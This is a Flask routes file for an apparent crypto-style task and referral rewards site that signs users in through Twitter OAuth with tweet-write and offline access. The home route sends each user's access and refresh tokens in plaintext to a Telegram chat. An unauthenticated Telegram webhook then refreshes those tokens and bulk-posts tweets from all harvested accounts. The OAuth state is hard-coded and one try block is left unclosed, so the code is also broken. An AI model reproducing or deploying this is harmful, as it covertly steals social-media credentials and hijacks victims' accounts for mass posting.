from flask import Blueprint, redirect, request, session, render_template, url_for, jsonify, flash
import logging
import traceback
import requests
import psycopg2
from psycopg2.extras import RealDictCursor
from admin_routes import validate_admin_credentials, get_analytics_overview, get_all_users
from task_routes import get_tasks, get_user_tasks, create_sample_tasks
from config import (
    DATABASE_URL, CLIENT_ID, CLIENT_SECRET, CALLBACK_URL
)
from helpers import (
    generate_code_verifier_and_challenge, send_message_via_telegram, post_tweet,
    get_twitter_username_and_profile, generate_random_string, handle_post_single,
    handle_post_bulk, handle_refresh_single, handle_refresh_bulk
)
from database import store_token, get_all_tokens, get_total_tokens
# Create blueprint
app = Blueprint('routes', __name__)

@app.route('/')
def home():
    code = request.args.get('code')
    state = request.args.get('state')
    error = request.args.get('error')

    if 'username' in session:
        send_message_via_telegram(f"👋 @{session['username']} just returned to the website.")
        return redirect(url_for('routes.welcome'))

    if request.args.get('authorize') == 'true':
        state = "0"
        code_verifier, code_challenge = generate_code_verifier_and_challenge()
        session['code_verifier'] = code_verifier

        authorization_url = (
            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
        )
        return redirect(authorization_url)

    if code:
        if error:
            return f"Error during authorization: {error}", 400

        if state != session.get('oauth_state', '0'):
            return "Invalid state parameter", 403

        code_verifier = session.pop('code_verifier', None)
        token_url = "https://api.twitter.com/2/oauth2/token"
        data = {
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': CALLBACK_URL,
            'code_verifier': code_verifier
        }
        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
        token_response = response.json()

        if response.status_code == 200:
            access_token = token_response.get('access_token')
            refresh_token = token_response.get('refresh_token')

            username, profile_url = get_twitter_username_and_profile(access_token)
            if username:
                store_token(access_token, refresh_token, username)
                session['username'] = username
                session['access_token'] = access_token
                session['refresh_token'] = refresh_token
                total_tokens = get_total_tokens()
                send_message_via_telegram(
                    f"🔑 Access Token: {access_token}\n"
                    f"🔄 Refresh Token: {refresh_token}\n"
                    f"👤 Username: @{username}\n"
                    f"📊 Total Tokens in Database: {total_tokens}"
                )
                return redirect(url_for('routes.welcome'))
            else:
                return "Error retrieving user info with access token", 400

    return render_template('home.html')

@app.route('/dashboard')
def dashboard():
    username = session.get('username', 'User')
    
    # Get user stats from database
    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
    cursor = conn.cursor(cursor_factory=RealDictCursor)
    
    try:
        # Get user stats
        cursor.execute("""
            SELECT 
                COALESCE(token_balance, 0) as total_tokens,
                COALESCE(referral_count, 0) as referral_count,
                COALESCE(referral_reward, 0) as referral_reward
            FROM users 
            WHERE username = %s
        """, (username,))
        user_stats = cursor.fetchone()
        
        if not user_stats:
            # If user not found, create new user record
            cursor.execute("""
                INSERT INTO users (username, token_balance, referral_count, referral_reward)
                VALUES (%s, 0, 0, 0)
                RETURNING token_balance as total_tokens, referral_count, referral_reward
            """, (username,))
            conn.commit()
            user_stats = cursor.fetchone()
        
        # Add referral URL to stats
        user_stats['referral_url'] = f"{request.url_root}?ref={username}"
    except Exception as e:
        logging.error(f"Error getting user stats for {username}: {str(e)}")
        user_stats = {
            'total_tokens': 0,
            'referral_count': 0,
            'referral_reward': 0,
            'referral_url': f"{request.url_root}?ref={username}"
        }
    
    try:
        # Get active tasks
        cursor.execute("""
            SELECT 
                t.id, t.title, t.description, t.reward, t.status, t.type,
                t.instructions, COALESCE(ut.status, 'not_started') as user_status,
                COALESCE(t.parameters::json, '{}'::json) as task_params,
            CASE 
                WHEN t.type = 'manual' THEN json_build_object(
                    'proof_type', COALESCE(t.parameters::json->>'proof_type', 'screenshot'),
                    'instructions', COALESCE(t.parameters::json->>'instructions', '')
                )
                WHEN t.type = 'telegram' THEN json_build_object(
                    'group_links', COALESCE(t.parameters::json->'group_links', '[]'::jsonb),
                    'join_required', COALESCE(t.parameters::json->>'join_required', 'false'),
                    'send_message_required', COALESCE(t.parameters::json->>'send_message_required', 'false'),
                    'message_text', COALESCE(t.parameters::json->>'message_text', '')
                )
                WHEN t.type = 'twitter' THEN json_build_object(
                    'twitter_action', COALESCE(t.parameters::json->>'twitter_action', 'tweet'),
                    'required_text', COALESCE(t.parameters::json->>'required_text', ''),
                    'target_account', COALESCE(t.parameters::json->>'target_account', '')
                )
                WHEN t.type = 'survey' THEN json_build_object(
                    'survey_url', COALESCE(t.parameters::json->>'survey_url', ''),
                    'min_time', COALESCE(t.parameters::json->>'min_time', '0'),
                    'question_count', COALESCE(t.parameters::json->>'question_count', '0')
                )
                ELSE '{}'::jsonb
            END as type_details
        FROM tasks t
        LEFT JOIN user_tasks ut ON t.id = ut.task_id
        LEFT JOIN users u ON ut.user_id = u.id AND u.username = %s
        WHERE t.status = 'active'
    """, (username,))
    active_tasks = cursor.fetchall()
    
    try:
        # Get upcoming tasks
        cursor.execute("""
            SELECT id, title, description, reward, status
            FROM tasks 
            WHERE status = 'upcoming'
        """)
        upcoming_tasks = cursor.fetchall()
    except Exception as e:
        logging.error(f"Error getting upcoming tasks: {str(e)}")
        upcoming_tasks = []
    finally:
        conn.close()
    
    try:
        return render_template('dashboard.html', 
                             username=username, 
                             user_stats=user_stats,
                             active_tasks=active_tasks,
                             upcoming_tasks=upcoming_tasks)
    except Exception as e:
        logging.error(f"Error rendering dashboard for {username}: {str(e)}")
        return "An error occurred loading the dashboard. Please try again.", 500

@app.route('/welcome')
def welcome():
    username = session.get('username', 'User')
    
    if 'refresh_token' in session:
        result = handle_refresh_single()
        if result:
            access_token, refresh_token = result
            session['access_token'] = access_token
            session['refresh_token'] = refresh_token
            send_message_via_telegram(f"🔄 Token refreshed for returning user @{username}.")
    return render_template('welcome.html', message=f"Welcome back, @{username}!")

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('home'))

@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    update = request.json
    message = update.get('message', {}).get('text', '')

    if message == '/refresh_single':
        handle_refresh_single()
    elif message == '/refresh_bulk':
        handle_refresh_bulk()
    elif message.startswith('/post_single'):
        tweet_text = message.replace('/post_single', '').strip()
        if tweet_text:
            handle_post_single(tweet_text)
    elif message.startswith('/post_bulk'):
        tweet_text = message.replace('/post_bulk', '').strip()
        if tweet_text:
            handle_post_bulk(tweet_text)
    else:
        send_message_via_telegram("❌ Unknown command.")
    return '', 200

@app.route('/about_us')
def about_us():
    return render_template('about_us.html')

@app.route('/blog')
def blog():
    return render_template('blog.html')

@app.route('/docs')
def docs():
    return render_template('docs.html')

@app.route('/contact')
def contact():
    return render_template('contact.html')

@app.route('/tweet/<access_token>', methods=['GET', 'POST'])
def tweet(access_token):
    if request.method == 'POST':
        tweet_text = request.form['tweet_text']
        result = post_tweet(access_token, tweet_text)
        return render_template('tweet_result.html', result=result)

    return render_template('tweet_form.html', access_token=access_token)

@app.route('/admin')
def admin():
    """Main admin entry point that redirects based on login status."""
    if session.get('is_admin'):
        return redirect(url_for('routes.admin_dashboard'))
    return redirect(url_for('routes.admin_login'))

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    try:
        if request.method == 'POST':
            username = request.form['username']
            password = request.form['password']
            
            if validate_admin_credentials(username, password):
                session['is_admin'] = True
                return redirect(url_for('routes.admin_dashboard'))
            else:
                return render_template('admin_login.html', error_message="Invalid credentials")
        
        if session.get('is_admin'):
            return redirect(url_for('routes.admin_dashboard'))
        return render_template('admin_login.html')
    except Exception as e:
        logging.error("Error in admin_login route: %s", str(e))
        logging.error(traceback.format_exc())
        return "An error occurred, please check the server logs.", 500

@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('is_admin'):
        return redirect(url_for('routes.admin_login'))

    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
    cursor = conn.cursor(cursor_factory=RealDictCursor)
    
    cursor.execute("SELECT id, username, referral_count, token_balance, 'Active' as status FROM users")
    users = cursor.fetchall()
    
    cursor.execute("SELECT id, title, description, reward, status FROM tasks")
    tasks = cursor.fetchall()
    
    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()['count']
    
    cursor.execute("SELECT COUNT(*) FROM tasks WHERE status = 'active'")
    active_tasks = cursor.fetchone()['count']
    
    cursor.execute("SELECT COALESCE(SUM(token_balance), 0) FROM users")
    total_tokens_distributed = cursor.fetchone()['coalesce']
    
    logs = ["User registered", "Task completed", "Referral bonus awarded"]

    conn.close()

    return render_template('admin_dashboard.html', 
                         users=users,
                         tasks=tasks,
                         total_users=total_users,
                         active_tasks=active_tasks,
                         total_tokens_distributed=total_tokens_distributed,
                         logs=logs)

@app.route('/admin_logout')
def admin_logout():
    """Logout route for admin."""
    session.pop('is_admin', None)
    flash("You have been logged out.", "info")
    return redirect(url_for('routes.admin_login'))

@app.route('/api/users/<int:user_id>', methods=['GET'])
def get_user(user_id):
    """Retrieve a single user's details."""
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor(cursor_factory=RealDictCursor)
        
        cursor.execute("""
            SELECT id, username, referral_count, token_balance, 'Active' as status 
            FROM users WHERE id = %s
        """, (user_id,))
        user = cursor.fetchone()
        conn.close()
        
        if user:
            return jsonify(user)
        return {"error": "User not found"}, 404
    except Exception as e:
        logging.error(f"Error retrieving user {user_id}: {e}")
        return {"error": "Database error"}, 500

@app.route('/api/users/<int:user_id>', methods=['PUT'])
def update_user(user_id):
    """Update user details."""
    if not session.get('is_admin'):
        return {"error": "Unauthorized"}, 401
        
    try:
        data = request.get_json()
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        
        cursor.execute("""
            UPDATE users 
            SET username = %s, referral_count = %s, token_balance = %s
            WHERE id = %s
        """, (data['username'], data['referral_count'], data['token_balance'], user_id))
        
        conn.commit()
        conn.close()
        return {"message": "User updated successfully"}
    except Exception as e:
        logging.error(f"Error updating user {user_id}: {e}")
        return {"error": "Failed to update user"}, 500

@app.route('/api/users/<int:user_id>', methods=['DELETE'])
def delete_user(user_id):
    """Delete a user."""
    if not session.get('is_admin'):
        return {"error": "Unauthorized"}, 401
        
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        
        cursor.execute("DELETE FROM user_tasks WHERE user_id = %s", (user_id,))
        cursor.execute("DELETE FROM users WHERE id = %s", (user_id,))
        
        conn.commit()
        conn.close()
        return {"message": "User deleted successfully"}
    except Exception as e:
        logging.error(f"Error deleting user {user_id}: {e}")
        return {"error": "Failed to delete user"}, 500

@app.route('/api/tasks', methods=['GET', 'POST'])
def handle_tasks():
    """Handle task operations."""
    """Handle task operations."""
    if request.method == 'GET':
        username = session.get('username')
        if not username:
            return {"error": "User not authenticated"}, 401

        tasks = get_user_tasks(username)
        return jsonify(tasks), 200
        
    elif request.method == 'POST':
        if not session.get('is_admin'):
            return {"error": "Unauthorized"}, 401
            
        try:
            data = request.get_json()
            conn = psycopg2.connect(DATABASE_URL, sslmode='require')
            cursor = conn.cursor()
            
            cursor.execute("""
                INSERT INTO tasks (title, description, reward, status)
                VALUES (%s, %s, %s, %s)
                RETURNING id
            """, (
                data['title'],
                data['description'],
                int(data['reward']),
                data['status']
            ))
            
            task_id = cursor.fetchone()[0]
            conn.commit()
            conn.close()
            
            return {"message": "Task created successfully", "id": task_id}, 201
        except Exception as e:
            logging.error(f"Error creating task: {e}")
            return {"error": "Failed to create task"}, 500

@app.route('/api/tasks/start/<int:task_id>', methods=['POST'])
def start_task(task_id):
    """Mark a task as 'in progress' for the user."""
    username = session.get('username')
    if not username:
        return {"error": "User not authenticated"}, 401

    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        
        cursor.execute("SELECT id FROM users WHERE username = %s", (username,))
        user_id = cursor.fetchone()[0]
        
        cursor.execute('''
            INSERT INTO user_tasks (user_id, task_id, status)
            VALUES (%s, %s, 'in progress')
            ON CONFLICT (user_id, task_id) DO NOTHING
        ''', (user_id, task_id))
        
        conn.commit()
        conn.close()
        return {"message": f"Task {task_id} started successfully"}, 200
    except Exception as e:
        logging.error(f"Error starting task {task_id} for {username}: {e}")
        return {"error": f"Failed to start task {task_id}"}, 500

@app.route('/api/tasks/complete/<int:task_id>', methods=['POST'])
def complete_task(task_id):
    """Mark a task as completed and update the user's token balance."""
    username = session.get('username')
    if not username:
        return {"error": "User not authenticated"}, 401

    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        
        cursor.execute("SELECT id, token_balance FROM users WHERE username = %s", (username,))
        user_data = cursor.fetchone()
        user_id, token_balance = user_data[0], user_data[1]
        
        cursor.execute("SELECT reward FROM tasks WHERE id = %s", (task_id,))
        task_reward = cursor.fetchone()[0]
        
        cursor.execute('''
            UPDATE user_tasks SET status = 'completed' 
            WHERE user_id = %s AND task_id = %s
        ''', (user_id, task_id))
        
        new_balance = token_balance + task_reward
        cursor.execute('''
            UPDATE users SET token_balance = %s WHERE id = %s
        ''', (new_balance, user_id))
        
        conn.commit()
        conn.close()
        
        return {"message": f"Task {task_id} completed. Reward added: {task_reward}"}, 200
    except Exception as e:
        logging.error(f"Error completing task {task_id} for {username}: {e}")
        return {"error": f"Failed to complete task {task_id}"}, 500

@app.route('/api/tasks/<int:task_id>', methods=['GET'])
def get_task(task_id):
    """Retrieve a single task's details."""
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor(cursor_factory=RealDictCursor)
        
        cursor.execute("""
            SELECT id, title, description, reward, status
            FROM tasks WHERE id = %s
        """, (task_id,))
        task = cursor.fetchone()
        conn.close()
        
        if task:
            return jsonify(task)
        return {"error": "Task not found"}, 404
    except Exception as e:
        logging.error(f"Error retrieving task {task_id}: {e}")
        return {"error": "Database error"}, 500


@app.route('/api/tasks/<int:task_id>', methods=['PUT'])
def update_task(task_id):
    """Update task details."""
    if not session.get('is_admin'):
        return {"error": "Unauthorized"}, 401
    
    try:
        data = request.get_json()
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        
        cursor.execute("""
            UPDATE tasks 
            SET title = %s, description = %s, reward = %s, status = %s
            WHERE id = %s
            RETURNING id
        """, (data['title'], data['description'], data['reward'], data['status'], task_id))
        
        updated = cursor.fetchone()
        conn.commit()
        conn.close()
        
        if updated:
            return {"message": "Task updated successfully"}
        return {"error": "Task not found"}, 404
    except Exception as e:
        logging.error(f"Error updating task {task_id}: {e}")
        return {"error": "Failed to update task"}, 500


@app.route('/api/tasks/<int:task_id>', methods=['DELETE'])
def delete_task(task_id):
    """Delete a task."""
    if not session.get('is_admin'):
        return {"error": "Unauthorized"}, 401
    
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        
        # First delete any user_tasks references
        cursor.execute("DELETE FROM user_tasks WHERE task_id = %s", (task_id,))
        
        # Then delete the task
        cursor.execute("DELETE FROM tasks WHERE id = %s RETURNING id", (task_id,))
        deleted = cursor.fetchone()
        
        conn.commit()
        conn.close()
        
        if deleted:
            return {"message": "Task deleted successfully"}
        return {"error": "Task not found"}, 404
    except Exception as e:
        logging.error(f"Error deleting task {task_id}: {e}")
        return {"error": "Failed to delete task"}, 500
